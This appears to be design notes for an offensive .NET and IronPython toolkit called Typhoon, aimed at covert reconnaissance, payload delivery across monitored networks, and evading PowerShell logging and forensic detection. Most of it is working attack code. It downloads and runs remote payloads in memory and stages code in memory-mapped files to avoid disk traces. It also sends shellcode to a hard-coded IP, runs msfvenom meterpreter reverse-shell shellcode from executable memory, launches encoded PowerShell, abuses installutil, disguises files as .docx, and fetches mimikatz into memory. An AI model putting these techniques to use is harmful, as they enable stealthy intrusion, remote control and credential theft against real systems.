


## Goals. What are we solving

- Ability to recon under the radar for longer (primary)
- Ability to better deliver code and payloads over .Net facilities across monitored systems and networks
- Ability to quickly retool. Building blocks vs. fingerprintable products.

###  Managed  (compiled) - CSaw
- Ability to dynamically compile CSharp code
- Ability to load assemblies in memory and  removing disk artifacts
- Ability to compile and run in separate invocations
- Ability to dynamically load an assembly and invoke and class in it
- Ability to REPL CSharp for quick gains 
- Ability to use CSharp to avoid PS monitoring
- Ability to increase effectiveness of payload delivery over managed code (a bonus)
- AppDomain assist
- Interop to native unmanaged

### Managed (dynamic) - DLRium

- Ability to leverage DLR to avoid Powershell logging while preserving scriptability (in cmparison to CS)
- Ability to leverage Python expressiveness and dynamic typing while still having ability to transparently engage .Net framework mechanisms
- Ability to compile Python to exe or dll via DLR
- Ability to drop down to .Net from Python or to Python from .Net (stealth, confusing analysis)
- Load from Bytes
- Interop to native unmanaged with load/unload
            
## Challenges. Technical and DFIR
- What artifacts does dynamic compilation produce. How can we minimize it.
- What facilities in .Net are available to increase stealth of both payload delivery and recon
- PyDLR != CPython
    - Stdlib modules minus (c, size, format). Size, format -> zip loading
    -  

## Example: Invoking Iron Python from IronPython over .Net Assembly w/variables (-> stealth)
```python
import clr
clr.AddReference('IronPython')
clr.AddReference('Microsoft.Scripting')

from IronPython.Hosting import Python
from Microsoft.Scripting import SourceCodeKind

code = "print string"
values = {'string': 'Hello World'}

engine = Python.CreateEngine()
source = engine.CreateScriptSourceFromString(code, SourceCodeKind.Statements)
mod = engine.CreateScope()

for name, value in values.items():
    setattr(mod, name, value)

source.Execute(mod)
```


## CSaw: List available managed compliers on the system (CSX format)
We would like to introduce a way to quickly REPL/prototype code 

```csharp
directive> using System;
directive> using System.IO;
directive> using System.Text;
directive> using System.CodeDom;
directive> using System.Diagnostics;
directive> using System.CodeDom.Compiler;
directive> END
code> foreach (System.CodeDom.Compiler.CompilerInfo ci in
code> System.CodeDom.Compiler.CodeDomProvider.GetAllCompilerInfo())
code> {
code>   foreach (string language in ci.GetLanguages())
code>   System.Console.Write("{0} ", language);
code>   System.Console.WriteLine();
code> }
code> END
Perforing dynamic compile and execution.

--- Result ---
c# cs csharp
vb vbs visualbasic vbscript
js jscript javascript
c++ mc cpp
directive>
```


## Delivery: Load PY over network, from CS code
Example: Direct PYDLR invoke

```csharp

WebClient wc = new WebClient();
Console.WriteLine("Getting Code payloads ...");
byte[] dllzip = wc.DownloadData(@"http://127.0.0.1:8000/Code.zip");

Stream zipdata = new MemoryStream(scriptzip);
Stream unzippedDataStream;
ZipArchive archive = new ZipArchive(zipdata, ZipArchiveMode.Read);

foreach (ZipArchiveEntry entry in archive.Entries)
{

    if (entry.FullName == @"payload.py")
    {
        Console.WriteLine("Unzipped File: {0}", entry.Name);
        unzippedDataStream = entry.Open();

        StreamReader reader = new StreamReader(unzippedDataStream);
        string codeText = reader.ReadToEnd();
        pythonScript = pengine.CreateScriptSourceFromString(codeText);
        Console.WriteLine("Executing Source >>>  {0} <<< ...", 
                        codeText.Substring(0, (codeText.Length >= 80) ? 79 : codeText.Length));
        pythonScript.Execute();
    }

}

```

## Stage code in memory mapped file (e.g. for further compilation)
- We save in memory resident store 
- We do not store on disk. Some defenses miss that. Some will flag. We can decouple payload storage and invocation on demand.

```csharp
Dictionary<String, MemoryMappedFile> mmfRepo = new Dictionary<String, MemoryMappedFile>();

// Load network bytes into memory stream and unzip in memory.
Stream dllzipdata = new MemoryStream(dllzip);
ZipArchive dllarchive = new ZipArchive(dllzipdata, ZipArchiveMode.Read);

Stream unzippedCSDataStream;
MemoryMappedFile mmf;
foreach (ZipArchiveEntry entry in dllarchive.Entries)
{
    if (entry.Name == @"payload.cs")
    {
        Console.WriteLine("Unzipped CSharp: {0}", entry.Name);
        unzippedCSDataStream = entry.Open();
        // Prepare Memory Map for file
        mmf = MemoryMappedFile.CreateNew(entry.Name, entry.Length);

        // Save mmf
        mmfRepo.Add(entry.Name, mmf);

        StreamReader reader = new StreamReader(unzippedCSDataStream);
        string codeText = reader.ReadToEnd();

        byte[] Buffer = ASCIIEncoding.ASCII.GetBytes(codeText);
        using (MemoryMappedViewStream stream = mmf.CreateViewStream())
        {
            BinaryWriter writer = new BinaryWriter(stream);
            writer.Write(Buffer);
        }
    }
}
```


 
### Methods of bringing assemblies across inspected network:

1. Compile `.cs` code and have DLLs as embedded resources in your assemblies
`/csc /resource:Ironpython.dll`

2. Bring modularized assemblies as netmodules. A Netmodule is an assembly without a manifest. Not identifiable or scannable as not executable. Complie to a product onsite.

`csc -target:module payload.cs `
`csc /netmodule:module`

Also, see Examples\ComplileNetMod.py
3. Possibly use .Net Download Cache facilities

`gacutul /ldl`

(Location where it downloads):
 C:\Users\dimas\AppData\Local\assembly\dl3\

You can modify. `yourexe.exe.config` file and point to remote DLL to fetch. 

Example:

```xml
 <?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5.2" />
  </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity
          name="IronPython"
          publicKeyToken="7f709c5b713576e1"
          culture="" />
        <codeBase version="2.7.7.0" href="http://127.0.0.1:8000/IronPython.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```

## DLRium: Example: compile netmodules in code, and then assemble them, in code

C:\Users\dimas\Documents\Projects\MET\Typhoon\Examples\Netmodules\CompileNetMod.py

## Attempt Logging evasion while maintaining productivity 

choices:

- cPython: Not logged but you need cPython on target machine (blacklisted)

```python
import urllib2
content = urllib2.urlopen("http://google.com").read()
print(content)
```

- CSharp: Not logged, but a direct compilation requires invocation of `csc.exe` executable from potentially logged shell. Powershell records you executing `csc.exe` or `msbuild.exe`.

```csharp
using System.Net
var content = string.Empty;
using (var webClient = new WebClient())
{
    content = webClient.DownloadString("http://google.com");
    Console.WriteLine(content);
}
```

- Powershell 5: Logged 

```powershell
$webClient = New-Object System.Net.WebClient
$content = $webClient.DownloadString("http://google.com")
Out-Host $content 
```

### Options: 
1) Dymamic CS compilation and invocation

Not logged, full .Net, as long as you can run an unsigned executable or invoke with already whitelisted: installutil: `%windir%\Microsoft.NET\Framework\v2.0.50727\installutil /logtoconsole=false /logfile= /u [your assembly .dll here]`

2) Invocation via  DLR
Python DLR. Not logged, dynamic, some batteries included. ^^ rules apply

##  CSaw: CSX script
- Some contract to code. Rudmintary (no classes no functions), fast and dirty prototype. Recon. (We will do better with extensions later).

```csharp 
using System; 
using System.Net;
END
WebClient client = new WebClient();
String address = @"https://google.com";
string reply = client.DownloadString (address);
Console.WriteLine("{0} ... ", reply.Substring(0, 80));
END
```

## DLRium PyDLR script
- Full Python flow and branching, as long as you stay sequential.

```python
from System.Net import WebClient
content = WebClient().DownloadString("http://google.com")
print content
```

## Evasion with productivity. .Net DLR + Python from CSharp


### PyDLR introspection via reflection. Even more stealth?

1. Python file which contains what we want to execute: `TestClass.py`
Trivial example of adding two numbers

```python 
# The class you want to access externally.
class DoCalculations():

 # A method within the class that adds two numbers.
 def DoAdd(self, First, Second):
    # Provide a result.
    return First + Second

# A test suite in IronPython.
def __test__():

 # Create the object.
 MyCalc = DoCalculations()

 # Perform the test.
 print MyCalc.DoAdd(5, 10)
```

2. Invoke PyDLR class from CSharp 

a. Normal invoke. 

```csharp 
// Obtain the runtime.
var IPY = Python.CreateRuntime();
// Create a dynamic object containing the script.
dynamic TestPy = IPY.UseFile(“TestClass.py”);
// Execute the __test__() method.
TestPy.__test__();
```

b. Reflective IronPython Invoke
```csharp
// Introspect iPython module:
// Create an object for performing tasks with the script.
ObjectOperations Ops = Eng.CreateOperations();
// Create the class object.
Source.Execute(Scope);
// Obtain the class object.
Object CalcClass = Scope.GetVariable(“DoCalculations”);
// Create an instance of the class.
Object CalcObj = Ops.Invoke(CalcClass);
// Get the method you want to use from the class instance.
Object AddMe = Ops.GetMember(CalcObj, “DoAdd”);
// Perform the add.
Int32 Result = (Int32)Ops.Invoke(AddMe, 5, 10);
```


## IronPython without STDLib included
```>>> print sys.builtin_module_names
('unicodedata', '_ast', 'imp', 'future_builtins', 'clr', 'exceptions', '__builtin__', 'sys', 'array', 'binascii', 'bz2', 'cmath', 'msvcrt', 'mmap', 'signal', 'winsound', 'zipimport', 'zlib', '_bisect', '_codecs', '_collections', 'copy_reg', 'cPickle', 'cStringIO', 'datetime', 'errno', 'gc', 'itertools', '_csv', '_io', '_locale', 'marshal', 'math', '_md5', 'nt', 'operator', 're', 'select', '_sha', '_sha256', '_sha512',/ 'socket', '_ctypes', '_ctypes_test', '_heapq', '_struct', 'thread', 'time', 'xxsubtype', '_functools', '_random', '_sre', '_ssl', '_subprocess', '_warnings', '_weakref', '_winreg')
```


## Load Ironpython Stdlib from zip. Zip can also be brought in as renamed `docx`
```python
sys.path.append(r"C:\Users\dimas\Downloads\dist\StdLib.docx")
```

- Benefits of StdLib you get a lot more `python` modules. Example:
`import traceback, os`
- Size increases.
- On-disk drop.
- Much available from .Net but can mix and match to confuse defenses more 

```python
import clr, sys
clr.AddReference('StdLib')
import  traceback, urllib
try:
  opener = urllib.FancyURLopener({})
  f = opener.open(r"http://www.python.org/")
  f.read()
except Exception as e:
  traceback.print_exc(file=sys.stdout)
  print e
END
```

# Note on Assemblies: .Net does not require them to be named DLL (.NEt loader does not care about name, only embeded manifest)
import clr
clr.AddReferenceToFileAndPath(r"C:\\Users\\dimas\\AppData\\Local\\Temp\tmp14A5.tmp")



### .Net is .Net . DLR is a .Net technique. Can expand easily into Win Forms, etc.

```python 
import clr; 
clr.AddReference("System.Windows.Forms") ;
from System.Windows.Forms import *; 
clr.AddReference("System.Drawing") ; 
clr.AddReference("System.Windows.Forms") ;
f = Form(); 
f.Show()
```


```python 
clr.AddReference("System.Windows.Forms")

from System.Windows.Forms import MessageBox
MessageBox.Show("Hello World")

from System.Threading import Thread, ThreadStart
def f():
   Thread.Sleep(1000)
   print "Thread Finished"

f()
```


## Compile PyDLR into dll and load it

File: `test.py`:
```python
def hello():
    print "Hello"
```

Compile and load:

```python
import clr
clr.CompileModules("test.dll", "test.py")
clr.AddReferenceByPartialName("test")
import test
print test.hello()
```

## Compile PyDLR to Exe.
- In fact, compile ron pyton interpreter to exe via reflection:

```batch
.\Typhoon.exe  -mode=exec -type=py -method=sfile -resource=..\..\Examples\Extensions\Pyc.py -targs="/target:exe /platform:x64 /main:test_main.py test_main.py" 
```

Run time dependencies still need to be accounted for. Depends how you look at it. Standalone payload functionality wtih dependent runtime libraries, vs. frozen fat binaries.

```batch
copy ..\..\Resources\IronPython.dll .
copy ..\..\Resources\Microsoft.Dynamic.dll .
copy ..\..\Resources\Microsoft.Scripting.dll .
```

## Multiline PyDLR REPL is possible. Even easier than CSSharp:

```python 
import clr
clr.AddReference("System.Windows.Forms")
from System.Windows.Forms import MessageBox
MessageBox.Show("Hello World")
END
```

# Interop Section
- Interop is interface with Native unmanaged code.
- what .Net cannot do unamanged can

## CSharp via DLLImport
```csharp
using System
using System.Runtime.InteropServices;

[DllImport("user32.dll", SetLastError = true)]
static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
    IntPtr thisW = FindWindowEx(IntPtr.Zero, IntPtr.Zero, null, "Downloads");

[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
public static extern bool SetWindowText(IntPtr hwnd, String lpString);
    SetWindowText(thisW, "Hello");
```

## Unamanged code via CodeDom from PyDLR:
See Examples\DLRExample1.py

## Unmanaged code via Ctypes (needs IP STDLib)
```python
import ctypes
buffer = ctypes.create_string_buffer(100)
ctypes.windll.kernel32.GetWindowsDirectoryA(buffer, len(buffer))
print buffer.value
```

See Examples\NCtypes.py for more 


## Dynamic WinaPi invoke cs script with shim assist
- Abstracts complexity 
- Does not lock resources. (.Net 2.x-4.x does not allow  unloading assemblies, unless in appdoamin (CSaw does it)  / DLium does it too)
- .Net load via bytes? PyDLR can Note: .Net Core is not tested. 

```csharp
using System; 
using DynamicLoad;
END
dynamic user32 = DynLibUtil.LoadWinapiPInvoke("user32");
user32.MessageBox(0, "Hello World", "P/Invoke Sample", 0);
END
```


## See Capture_via_compile for full example of interop


## Shellcode
Options:
 - void pointer to memory mapped file 
 - via virtualalloc 


a. via PyDLR
```python
try:
    import socket
except Exception as e:
    print e


from System.Threading import Thread, ThreadStart

def scode():
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(("192.168.88.31", 8080))

  buf =  ""
  buf += "\xdb\xc3\xbd\x9c\xec\x7c\x70\xd9\x74\x24\xf4\x5a\x31"
  buf += "\xc9\xb1\x89\x31\x6a\x17\x03\x6a\x17\x83\x76\x10\x9e"
  buf += "\x85\x5d\x36\xe2\xbc\xbe\xe4\x03\x98\x34\xd3\xcf\x45"
  buf += "\x41\x7a\xf3\xc9\x40\x60\x8d\x72\x24\x0c\x83\xf8\x1d"
  buf += "\x7a\x89\x79\xe9\xe6\x4d\x96\xd6\xe8\x22\x02\x21\xcd"
  buf += "\x18\x2c\x21\x6d\x85\xa1\xa0\xcb\x88\xfd\x01\x0d\x7b"
  buf += "\xdc\x3a\x3f\x58\xec\x00\x16\x38\x52\x32\xb2\x79\xb4"
  buf += "\x39\x23\x2f\xae\xbe\x29\xd3\x63\xb1\xc6\xb5\xf9"


  sock.send(buf)
  sock.close()

scode()
```

b. via CSharp

see C:\Users\dimas\Documents\Projects\MET\Typhoon\Examples\ShellCode.cs

```csharp
 mmf = MemoryMappedFile.CreateNew("__shellcode",
                            shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

// Create a memory mapped view accessor with read/write/execute permissions..
mmva = mmf.CreateViewAccessor(0, shellcode.Length,
            MemoryMappedFileAccess.ReadWriteExecute);

// Write the shellcode to the MMF..
mmva.WriteArray(0, shellcode, 0, shellcode.Length);

// Obtain a pointer to our MMF..
var pointer = (byte*)0;
mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

// Create a function delegate to the shellcode in our MMF..
var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer),
                            typeof(GetPebDelegate));

// Invoke the shellcode..
return func();
```

```csharp
                private WorkThreadFunction(ShellCode){
                    DynCSharpRunner.CompileRunShellCode(ShellCode);
                }
               //msfvenom  -p windows/meterpreter/reverse_tcp --platform windows ReverseConnectRetries=255   
                            PrependMigrate=true  LHOST=172.16.56.230 LPORT=1337 -e x86/shikata_ga_nai -i 3 -f  csharp 
                String ShellCode = @"
                    0xdb,0xc0,0xb8,0x22,0x07,0x27,0xf3,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,
                    0x61,0x31,0x46,0x1a,0x83,0xc6,0x04,0x03,0x46,0x16,0xe2,0xd7,0xba,0x1c,0x88,
                    0xb0,0x69,0xed,0x38,0xfb,0x8e,0x25,0x5a,0x04 ....
                    ";


                Thread thread = new Thread(new ThreadStart(WorkThreadFunction));
                thread.IsBackground = true;
                thread.Start();
```


## If you want powershell interface you could do:
```python 

# Process start 
try:
    from System.Diagnostics import Process
    # As an option
    Process.Start('powershell.exe', '')
except Exception as e:
    traceback.print_exc(file=sys.stdout)

# More controlled invocation
p = Process()
p.StartInfo.UseShellExecute = False
p.StartInfo.RedirectStandardOutput = True
p.StartInfo.FileName = 'pOwersHell.exE'
p.StartInfo.Arguments = " -nop -encodedcommand JABzAD0ATgBlAHcALQBPAGI ..... "
p.Start()
p.WaitForExit() 
```


## Develop with  PyDLR: Casting, Typing, Lambdas, etc

```python
from System.Collections.Generic import IEnumerable, List
list = List[int]([1, 2, 3])
import clr
clr.AddReference("System.Core")
from System.Linq import Enumerable
Enumerable.Any[int](list, lambda x : x < 2)
```




## Download of file over TLS, Unzip into memory

```
zip=wc.DownloadData("https://github.com/gentilkiwi/mimikatz/releases/download/3.1.1-20180322/mimikatz_trunk.zip")
zipdata = MemoryStream(zip)

archive = ZipArchive(zipdata, ZipArchiveMode.Read)
print(archive)
<System.IO.Compression.ZipArchive object at 0x000000000000002B [System.IO.Compression.ZipArchive]>
```

## CSaw: Extensions.
- Dynamic class building with disposable interface
- Contract:

```csharp
        public void PreLaunch() {}
        public void RunCode(){}
        public void PostLaunch() {}
```


## NEED:
- reflection/emit examples:
  WmiQuery.cs
  Pyc.py

- CodeDom
- csc compilation (DFIR perspective):

  ```csharp
                // In-memory generation is a misnomer. There are some artifacts left on disk, 
                // in-memory really means `in temp`
                // Example of artifacts for in-memory compilation and preservation of temp files:
                /*
                 * λ dir "C:\Users\dimas\AppData\Local\Temp\tmp*"
                     Volume in drive C has no label.
                     Volume Serial Number is ECBC-2429

                    Directory of C:\Users\dimas\AppData\Local\Temp

                    08/12/2017  10:31 PM                 0 tmp16A6.tmp
                    08/12/2017  10:30 PM                 0 tmpF581.tmp
                    08/12/2017  10:32 PM             2,080 1vvp5flt.0.cs

                    If temp files are preserved we see:
                    08/12/2017  10:32 PM               778 1vvp5flt.cmdline
                    08/12/2017  10:32 PM                 0 1vvp5flt.err
                    08/12/2017  10:32 PM             1,353 1vvp5flt.out
                    08/12/2017  10:32 PM                 0 1vvp5flt.tmp
                */
                parameters.GenerateInMemory = true
  ``` 
  ```csharp
                // options for the compiler. We choose `unsafe` because we want a raw pointer to the buffer containing shellcode
                // parameters.CompilerOptions += "/optimize+ ";
                // parameters.CompilerOptions += "/target:module"; 
                parameters.CompilerOptions += "/nologo /unsafe"
  ```
  ```csharp
                // This call to .CompiledAssembly loads the newly compile assembly into memory. 
                // Now we can release locks on the assembly file, and delete it after we get the type to run
                // Deletion of the assembly file is possible because we are executing in a new AppDomain. 
                // Normally we cannot delete an asembly if it's being used/loadded in the same AppDomain. It is locked by the process.
                var type = cr.CompiledAssembly.GetType("DynamicShellCode.DynamicShellCodeCompile")
  ```
# TODO 
check releases 3.6, core https://github.com/IronLanguages/dlr/releases
and platforms C:\Users\dimas\Downloads\IronPython-2.7.7-win\IronPython-2.7.7\Platforms

Methods:
- Alt Streams delivery
- csc compilation to AppTemp
- app.exe.config download of content to Temp/dl3
- loading python stdlib from PKzip (docx)
- loading .net modules
- memory mapped registry of source compile (py and cs)
- python exploit scripts compat (msf payloads)
- loading and executing exes from memory (mimikatz)
- side loading pip packages in zips. 
- Win32 API call proxy (.cs or .py)
0. Add resourced in resource editor
1. Build action: Embeedded resource